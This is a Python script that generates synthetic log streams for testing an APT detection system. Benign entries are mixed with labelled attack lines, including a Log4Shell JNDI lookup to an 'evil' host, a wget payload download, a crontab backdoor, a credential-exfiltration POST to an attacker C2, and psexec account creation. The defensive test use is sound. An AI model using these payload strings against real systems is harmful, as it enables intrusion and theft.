#!/usr/bin/env python3
"""
Streaming Log Generator

Simulates a real-time log stream for testing the APT detection system.

Features:
- Generates logs at configurable rate (logs/sec)
- Mixes benign traffic with embedded APT campaigns
- Outputs to stdout or TCP socket
- Realistic timing and patterns
"""

import json
import time
import random
import argparse
import socket
from datetime import datetime, timedelta
from typing import List, Dict, Any
import sys
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent))


class StreamingLogGenerator:
    """Generates realistic streaming logs"""

    def __init__(self, logs_per_second: int = 100):
        """
        Initialize streaming generator

        Args:
            logs_per_second: Target log generation rate
        """
        self.logs_per_second = logs_per_second
        self.interval = 1.0 / logs_per_second if logs_per_second > 0 else 0.1

        # Benign log templates
        self.benign_templates = [
            "GET /api/users HTTP/1.1 200 OK",
            "POST /api/login HTTP/1.1 200 OK",
            "GET /index.html HTTP/1.1 200 OK",
            "SELECT * FROM users WHERE id = {id}",
            "INFO Application started successfully",
            "INFO User {user} logged in from {ip}",
            "DEBUG Processing request for user {user}",
            "INFO Database connection established",
            "INFO Email sent to {email}",
            "INFO File uploaded: document{id}.pdf",
        ]

        # APT campaign templates (embedded gradually)
        self.apt_campaigns = {
            'log4shell': [
                'GET /api/search?q=${{jndi:ldap://evil{n}.com/exploit}} HTTP/1.1',
                'Runtime.exec("/bin/bash -c wget http://malware{n}.com/payload.sh")',
                'crontab entry added: @reboot /tmp/.hidden/backdoor{n}.sh',
                'POST http://c2-{n}.attacker.com/exfil data=credentials.db'
            ],
            'eternalblue': [
                'SMB1 connection to \\\\\\\\{ip}\\\\PIPE\\\\samr detected',
                'Process created: psexec \\\\\\\\{ip} cmd.exe /c net user hacker{n} Pass123!',
                'File encrypted: document{n}.docx.locked - Ransom note created'
            ],
            'zerologon': [
                'Netlogon authentication bypass: NetrServerAuthenticate3 with zero challenge',
                'DCSync attack: DsGetNCChanges requesting krbtgt hash',
                'Domain Admin access: user{n} logged in with compromised credentials'
            ]
        }

        self.ips = [f"192.168.{random.randint(1,255)}.{random.randint(1,255)}" for _ in range(20)]
        self.users = ["john.doe", "jane.smith", "alice.williams", "bob.johnson"]
        self.emails = [f"{u}@company.com" for u in self.users]

    def generate_benign_log(self) -> Dict[str, Any]:
        """Generate a single benign log entry"""
        template = random.choice(self.benign_templates)

        # Fill in template variables
        log_text = template.format(
            id=random.randint(1, 1000),
            user=random.choice(self.users),
            ip=random.choice(self.ips),
            email=random.choice(self.emails)
        )

        return {
            'timestamp': datetime.utcnow().isoformat() + 'Z',
            'source_ip': random.choice(self.ips),
            'target': f'server-{random.randint(1,10)}',
            'log': log_text,
            'category': 'benign'
        }

    def generate_apt_log(self, campaign: str, stage: int) -> Dict[str, Any]:
        """Generate an APT campaign log entry"""
        templates = self.apt_campaigns.get(campaign, [])
        if stage >= len(templates):
            stage = len(templates) - 1

        template = templates[stage]

        # Fill in template variables
        log_text = template.format(
            n=random.randint(1, 100),
            ip=random.choice(self.ips)
        )

        return {
            'timestamp': datetime.utcnow().isoformat() + 'Z',
            'source_ip': f'10.0.{random.randint(1,50)}.{random.randint(1,255)}',
            'target': f'server-{random.randint(1,5)}',
            'log': log_text,
            'category': 'malicious',
            'campaign': campaign,
            'stage': stage + 1
        }

    def stream_logs(
        self,
        duration_seconds: int = 60,
        apt_probability: float = 0.001,
        output_mode: str = 'stdout'
    ):
        """
        Stream logs for specified duration

        Args:
            duration_seconds: How long to stream
            apt_probability: Probability of APT log (0.001 = 0.1%)
            output_mode: 'stdout' or 'socket'
        """
        print(f"Starting log stream...", file=sys.stderr)
        print(f"  Rate: {self.logs_per_second} logs/sec", file=sys.stderr)
        print(f"  Duration: {duration_seconds} seconds", file=sys.stderr)
        print(f"  APT probability: {apt_probability:.3%}", file=sys.stderr)
        print(f"  Output: {output_mode}", file=sys.stderr)
        print(f"", file=sys.stderr)

        start_time = time.time()
        logs_generated = 0
        apt_logs_generated = 0

        # Track active APT campaigns
        active_campaigns = {}

        try:
            while time.time() - start_time < duration_seconds:
                loop_start = time.time()

                # Decide if this should be an APT log
                if random.random() < apt_probability:
                    # Generate APT log
                    campaign = random.choice(list(self.apt_campaigns.keys()))

                    # Track campaign progression
                    if campaign not in active_campaigns:
                        active_campaigns[campaign] = 0

                    stage = active_campaigns[campaign]
                    log = self.generate_apt_log(campaign, stage)

                    # Progress campaign
                    active_campaigns[campaign] = (stage + 1) % len(self.apt_campaigns[campaign])
                    apt_logs_generated += 1

                else:
                    # Generate benign log
                    log = self.generate_benign_log()

                # Output log
                if output_mode == 'stdout':
                    print(json.dumps(log))
                    sys.stdout.flush()

                logs_generated += 1

                # Status update
                if logs_generated % 1000 == 0:
                    elapsed = time.time() - start_time
                    actual_rate = logs_generated / elapsed if elapsed > 0 else 0
                    print(f"[{elapsed:.1f}s] Generated {logs_generated:,} logs "
                          f"({apt_logs_generated} APT) - Rate: {actual_rate:.0f} logs/sec",
                          file=sys.stderr)

                # Sleep to maintain rate
                elapsed = time.time() - loop_start
                sleep_time = max(0, self.interval - elapsed)
                if sleep_time > 0:
                    time.sleep(sleep_time)

        except KeyboardInterrupt:
            print(f"\nStream interrupted by user", file=sys.stderr)

        # Final stats
        total_time = time.time() - start_time
        actual_rate = logs_generated / total_time if total_time > 0 else 0

        print(f"\n{'='*60}", file=sys.stderr)
        print(f"Stream Complete", file=sys.stderr)
        print(f"{'='*60}", file=sys.stderr)
        print(f"Total logs: {logs_generated:,}", file=sys.stderr)
        print(f"APT logs: {apt_logs_generated}", file=sys.stderr)
        print(f"Duration: {total_time:.2f} seconds", file=sys.stderr)
        print(f"Actual rate: {actual_rate:.1f} logs/sec", file=sys.stderr)
        print(f"{'='*60}", file=sys.stderr)


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='Generate streaming logs for APT detection testing'
    )

    parser.add_argument(
        '--rate',
        type=int,
        default=100,
        help='Logs per second (default: 100)'
    )

    parser.add_argument(
        '--duration',
        type=int,
        default=60,
        help='Stream duration in seconds (default: 60)'
    )

    parser.add_argument(
        '--apt-prob',
        type=float,
        default=0.001,
        help='APT log probability (default: 0.001 = 0.1%%)'
    )

    parser.add_argument(
        '--output',
        type=str,
        choices=['stdout', 'socket'],
        default='stdout',
        help='Output mode (default: stdout)'
    )

    args = parser.parse_args()

    # Create generator
    generator = StreamingLogGenerator(logs_per_second=args.rate)

    # Start streaming
    generator.stream_logs(
        duration_seconds=args.duration,
        apt_probability=args.apt_prob,
        output_mode=args.output
    )


if __name__ == "__main__":
    main()
